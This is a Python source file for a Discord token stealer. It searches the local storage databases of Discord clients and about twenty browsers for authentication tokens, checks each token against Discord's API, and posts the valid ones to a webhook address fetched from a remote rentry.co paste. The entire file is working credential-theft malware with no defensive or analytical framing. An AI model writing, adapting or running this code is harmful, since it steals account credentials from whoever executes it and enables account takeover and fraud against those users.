import os, re, json, threading, urllib.request

__HOOK__ = 'https://rentry.co/a25u7/raw'

class Bunny:
    def __init__(self):
        self.path = [
            '_Roaming/Discord/Local Storage/leveldb',
            '_Roaming/Lightcord/Local Storage/leveldb',
            '_Roaming/discordptb/Local Storage/leveldb',
            '_Roaming/discordcanary/Local Storage/leveldb',
            '_Roaming/Opera Software/Opera Stable/Local Storage/leveldb',
            '_Roaming/Opera Software/Opera GX Stable/Local Storage/leveldb',
            '_Local/Amigo/User Data/Local Storage/leveldb',
            '_Local/Torch/User Data/Local Storage/leveldb',
            '_Local/Kometa/User Data/Local Storage/leveldb',
            '_Local/Orbitum/User Data/Local Storage/leveldb',
            '_Local/CentBrowser/User Data/Local Storage/leveldb',
            '_Local/7Star/7Star/User Data/Local Storage/leveldb',
            '_Local/Sputnik/Sputnik/User Data/Local Storage/leveldb',
            '_Local/Vivaldi/User Data/Default/Local Storage/leveldb',
            '_Local/Google/Chrome SxS/User Data/Local Storage/leveldb',
            '_Local/Epic Privacy Browser/User Data/Local Storage/leveldb',
            '_Local/Google/Chrome/User Data/Default/Local Storage/leveldb',
            '_Local/uCozMedia/Uran/User Data/Default/Local Storage/leveldb',
            '_Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb',
            '_Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb',
            '_Local/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb',
            '_Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb',
        ]
    
    def __resolve_hook(self): return urllib.request.urlopen(urllib.request.Request(__HOOK__)).read().decode('utf-8')

    def __get_tokens(self):
        found_tokens = []

        for path in self.path:
            path = path.replace('_Local', os.getenv('LOCALAPPDATA')).replace('_Roaming', os.getenv('APPDATA'))

            if os.path.exists(path):
                for file_name in os.listdir(path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue

                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}', line):
                            found_tokens.append(token)
        
        return list(set(found_tokens))
    
    def __check_tokens(self, token_list: list):
        checked_tokens = []
        checker_thread = []

        def check(token: str):
            try:
                res = urllib.request.urlopen(urllib.request.Request('https://discord.com/api/v9/users/@me/library', headers= {'content-type': 'application/json', 'authorization': token, 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}, method= 'GET')).getcode()

                if res == 200:
                    checked_tokens.append(token)
            except:
                pass

        for token in token_list:
            checker_thread.append(threading.Thread(target= check, args=(token,)))
        
        for T in checker_thread:
            T.start()
        
        for T in checker_thread:
            T.join()
        
        valid_tokens = ''
        for token in checked_tokens:
            valid_tokens += f'\n{token}'

        return valid_tokens

    def main(self):
        hook = self.__resolve_hook()
        tokens = self.__check_tokens(self.__get_tokens())

        if tokens != '':
            try:
                urllib.request.urlopen(urllib.request.Request(hook, data= json.dumps({'content': f'>>> ||@everyone||\n```{tokens}```'}).encode(), headers= { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}))
            except:
                pass

def init():
    threading.Thread(target= Bunny().main()).start()